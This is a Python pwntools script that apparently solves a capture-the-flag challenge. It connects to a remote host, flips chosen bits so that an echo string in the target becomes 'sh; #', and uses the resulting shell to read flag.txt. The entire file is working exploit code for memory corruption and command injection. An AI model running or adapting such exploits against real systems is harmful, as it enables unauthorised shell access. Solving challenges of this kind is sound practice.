#!/usr/bin/env python3
import pwn
import itertools

pwn.context.log_level = "warn"

r = pwn.remote("188.126.67.132", 50011)
# r = pwn.process("./bitter")

# cmd: str = input("Enter command: ")
cmd: str = "cat flag.txt"

org = "echo Thank you for making my hummus mummus again!"
new = "sh; #"

def send_flip(idx):
    r.recvuntil(b"position to flip: ")
    r.sendline(str(idx).encode())

str_off = 768
bitter_off = 128


for j, (og, nw) in enumerate(zip(org, new)):
    og_bin = bin(ord(og))[2:][::-1].ljust(8, "0")
    nw_bin = bin(ord(nw))[2:][::-1].ljust(8, "0")

    for i, o, n in zip(itertools.count(str_off), og_bin, nw_bin):
        if o == n:
            continue
        send_flip(j * 8 + i)
        # print(f"send: {str_off}")

send_flip(bitter_off)

r.sendline(cmd.encode())
print(r.recvline().decode().strip())

